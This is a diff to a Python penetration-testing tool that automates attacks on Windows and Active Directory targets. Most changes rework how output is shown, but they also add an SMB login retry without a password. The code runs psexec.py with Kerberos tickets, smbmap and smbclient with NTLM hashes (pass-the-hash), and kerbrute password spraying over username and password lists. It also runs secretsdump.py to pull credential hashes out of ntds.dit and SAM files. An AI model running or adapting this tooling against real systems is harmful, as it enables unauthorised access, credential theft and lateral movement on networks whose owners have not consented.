@@ -74,6 +74,7 @@ def cutLine(variable1, variable2):
 # REMOVE SPACE AND EXTRA LINES   
 def parsFile(variable):
    localCOM("sed -i '/^$/d' ./" + variable)
+   cutLine("Impacket", variable)
    return
 
 # PERFORM A PROPER LINE COUNT
@@ -112,6 +113,7 @@ def nmapTrim(variable):
 
 # OUTPUT THE FILE CONTENTS IN GREEN   
 def catsFile(variable):
+   parsFile(variable)
    CHAR_DELAY = 0.05 
    filename = variable
    localCOM("echo '" + Green + "'")
@@ -281,9 +283,11 @@ def privCheck():
          localCOM("export KRB5CCNAME=" + ticket)
          print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
          if ",443," in PTS:
-            remoteCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
+            remoteCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass > privcheck1.tmp")
+            catsFile("privcheck1.tmp")            
          else:
-            remoteCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass")         
+            remoteCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -no-pass > privcheck1.tmp") 
+            catsFile("privcheck1.tmp")
       else:
          print("[-] Unable to find a valid ticket...")
    return spacePadding(ticket, COL1)
@@ -330,8 +334,7 @@ def checkInterface(variable, COM):
       if variable == "TIP":
          remoteCOM("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")           
       cutLine("PING","ping.tmp")         # First line
-      cutLine("statistics","ping.tmp")   # Third from bottom
-      parsFile("ping.tmp")		
+      cutLine("statistics","ping.tmp")   # Third from bottom	
       localCOM("sed -i '$d' ./ping.tmp") # Last line
       count = lineCount("ping.tmp")
       nullTest = linecache.getline("ping.tmp", count).rstrip("\n")
@@ -2317,27 +2320,34 @@ while True:
       checkParams = test_TIP()      
       if checkParams != 1:
          print(colored("[*] Finding shares, please wait...", colour3))         
+
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             remoteCOM("smbmap --no-banner -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + "%:" + NTM.rstrip(" ") + " > shares1.tmp 2>&1")
          else:
-            if PAS.rstrip(" ") == "''":
-               remoteCOM("smbmap --no-banner -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " --no-pass > shares1.tmp 2>&1")
-            else:   
-               remoteCOM("smbmap --no-banner -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " > shares1.tmp 2>&1")
-            smbParser("shares1.tmp")
-            catsFile('shares1.tmp')    
+            remoteCOM("smbmap --no-banner -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " > shares1.tmp 2>&1")  
+            errorCheck = linecache.getline("shares1.tmp", 1)
+            if "session setup failed: NT_STATUS_LOGON_FAILURE" in errorCheck:
+               print("[-] NT_STATUS_LOGON_FAILURE - Trying with --no-pass...")
+               remoteCOM("smbmap --no-banner -H " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " > shares1.tmp 2>&1") 
+
+         smbParser("shares1.tmp")
+         catsFile('shares1.tmp')    
+ 
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")            
             remoteCOM("smbclient -L //" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --pw-nt-hash " + NTM.rstrip(" ") + " > shares2.tmp 2>&1")
          else:
-            if PAS.rstrip(" ") == "''":
-               remoteCOM("smbclient -L //" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " --no-pass > shares2.tmp 2>&1")
-            else:
-               remoteCOM("smbclient -L //" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " > shares2.tmp 2>&1")               
+            remoteCOM("smbclient -L //" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --password=" + PAS.rstrip(" ") + " > shares2.tmp 2>&1")
+            errorCheck = linecache.getline("shares2.tmp", 1)
+            if "session setup failed: NT_STATUS_LOGON_FAILURE" in errorCheck:
+               print("[-] NT_STATUS_LOGON_FAILURE - Trying with --no-pass...")
+               remoteCOM("smbclient -L //" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + " --no-pass" + PAS.rstrip(" ") + " > shares2.tmp 2>&1")    
+               
+                         
          smbParser("shares2.tmp")
-         catsFile('shares2.tmp')
-         
+         catsFile("shares2.tmp")        
+   
          bonusCheck = linecache.getline("shares2.tmp", 1)
          if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
             print(colored("[!] Bonus!! It looks like we can change this users password...", colour0))
@@ -2358,7 +2368,6 @@ while True:
                cutLine("Nmap scan report", "exploit.tmp")
                cutLine("Host is up", "exploit.tmp")
                cutLine("Nmap done","exploit.tmp")
-               parsFile("exploit.tmp")
                catsFile("exploit.tmp")
       else:
          print("[+] Unable to obtains shares...")
@@ -2397,7 +2406,6 @@ while True:
             print(colored("[*] Mapping Shares...", colour3))
             remoteCOM("smbmap --no-banner -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -s " + TSH.rstrip(" ") + " --depth 15 > mapped.tmp")            
             smbParser("mapped.tmp")
-            parsFile("mapped.tmp")
             catsFile("mapped.tmp")
       prompt()
       
@@ -2507,7 +2515,7 @@ while True:
                for loop in range(0, count):
                   checkname = read.readline().rstrip("\n")
                   checkname = spacePadding(checkname, COL3)               
-                  for x in range(0, count):
+                  for x in range(0, maxUser):
                      if checkname == USER[x]:
                         print(colored((USER[x]), colour6))
                         VALD[x] = "1"
@@ -2544,39 +2552,51 @@ while True:
          checkParam = test_DOM()
       if checkParam != 1:
          print(colored("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...", colour3))
-         remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp")
+         remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password '" + PAS.rstrip(" ") + "' -outputfile password1.tmp > pass1.tmp")
          if os.path.getsize("password1.tmp") == 0:
             pass
          else:
+            catsFile("pass1.tmp")
             test1 = linecache.getline("password1.tmp",1)   
             found = 1
-            USR,PAS = test1.split(":")         
+            USR,PAS = test1.split(":")
+            PAS = PAS.rstrip()
+            if PAS == "".rstrip(): 
+               PAS = "''"       
             USR = spacePadding(USR, COL1)
             PAS = spacePadding(PAS, COL1)
             TGT = privCheck()                      
          if found == 0:
             print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
-            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")                       
+            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp > pass2.tmp")                       
             if os.path.getsize("password2.tmp") == 0:
                pass
             else:
+               catsFile("pass2.tmp")
                test2 = linecache.getline("password2.tmp",1)   
                found = found + 1
                USR,PAS = test2.split(":")
+               PAS = PAS.rstrip()
+               if PAS == "".rstrip(): 
+                  PAS = "''"   
                USR = spacePadding(USR, COL1)             
                PAS = spacePadding(PAS, COL1)
                TGT = privCheck()
          if found == 0:
             print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
-            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
+            remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp > pass3.tmp")                 
             if os.path.getsize("password3.tmp") == 0:
                pass
             else:
+               catsFile("pass3.tmp")                           
                test3 = linecache.getline("password3.tmp",1)   
                USR,PAS = test3.split(":") 
+               PAS = PAS.rstrip()
+               if PAS == "".rstrip(): 
+                  PAS = "''" 
                USR = spacePadding(USR, COL1)            
                PAS = spacePadding(PAS, COL1)
-               TGT = privCheck()               
+               TGT = privCheck()
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2921,8 +2941,6 @@ while True:
 
    if selection == '66':
       localCOM(keyPath + "describeTicket.py " + TGT.rstrip(" ") + " > ticket.tmp")
-      cutLine("Impacket v0.12.0", "ticket.tmp")
-      parsFile("ticket.tmp")
       catsFile("ticket.tmp")
       prompt() 
                
@@ -3617,7 +3635,7 @@ while True:
          print(colored("[*] Extracting stored secrets, please wait...", colour3))         
          if os.path.exists("./" + workDir + "/ntds.dit"):
             print("[+] Found ntds.dit...")
-            remoteCOM(keyPath + "impacket-secretsdump -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
+            remoteCOM("secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
             cutLine("[*]", workDir + "/sam-extract.sam")
             cutLine("[-]", workDir + "/sam-extract.sam")
             localCOM("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
@@ -3625,14 +3643,14 @@ while True:
          else:
             if os.path.exists("./" + workDir + "/SECURITY"):
                print("[+] Found SAM, SYSTEM and SECURITY...")
-               localCOM(keyPath + "impacket-secretsdump -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
+               localCOM("secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
                cutLine("[*]", workDir + "/sam-extract.sam")
                cutLine("[-]", workDir + "/sam-extract.sam")
                localCOM("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
                localCOM("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
             else:
                print("[+] Found SAM and SYSTEM...")
-               localCOM("impacket-secretsdump -system ./" + workDir + "/SYSTEM -sam ./" + workDir + "/SAM -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile  ./" + workDir + "/sam-extract > log.tmp")
+               localCOM("secretsdump.py -system ./" + workDir + "/SYSTEM -sam ./" + workDir + "/SAM -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile  ./" + workDir + "/sam-extract > log.tmp")
                cutLine("[*]", workDir + "/sam-extract.sam")
                cutLine("[-]", workDir + "/sam-extract.sam")
                localCOM("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
@@ -3973,7 +3991,6 @@ while True:
             if "IOS" in service.upper():
                OSF = spacePadding("IOS", COL1) 
             print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")
-            parsFile("basic.tmp")
             catsFile("basic.tmp")            
          else:
             print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
@@ -3992,7 +4009,6 @@ while True:
             if "IOS" in service.upper():
                OSF = spacePadding("IOS", COL1)
             print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...") 
-            parsFile("basic.tmp")
             catsFile("basic.tmp")
          if (",500," in PTS):
             iker(TIP)
@@ -4026,7 +4042,6 @@ while True:
             if "IOS" in service.upper():
                OSF = spacePadding("IOS", COL1)   
             print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")
-            parsFile("light.tmp")
             catsFile("light.tmp")            
          else:
             print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
@@ -4045,7 +4060,6 @@ while True:
             if "IOS" in service.upper():
                OSF = spacePadding("IOS", COL1)  
             print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")           
-            parsFile("light.tmp")
             catsFile("light.tmp")
          if (",500," in PTS):
             iker(TIP)
@@ -4079,7 +4093,6 @@ while True:
             if "IOS" in service.upper():
                OSF = spacePadding("IOS", COL1)  
             print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")                 
-            parsFile("heavy.tmp")
             catsFile("heavy.tmp")                   
          else:
             print(colored("[*] Scanning all ports, please wait this may take sometime...", colour3))
@@ -4097,7 +4110,6 @@ while True:
             if "IOS" in service.upper():
                OSF = spacePadding("IOS", COL1)
             print("[+] Changing O/S format to " + OSF.rstrip(" ") + "...")               
-            parsFile("heavy.tmp")
             catsFile("heavy.tmp")
          if (",500," in PTS):
             iker(TIP)
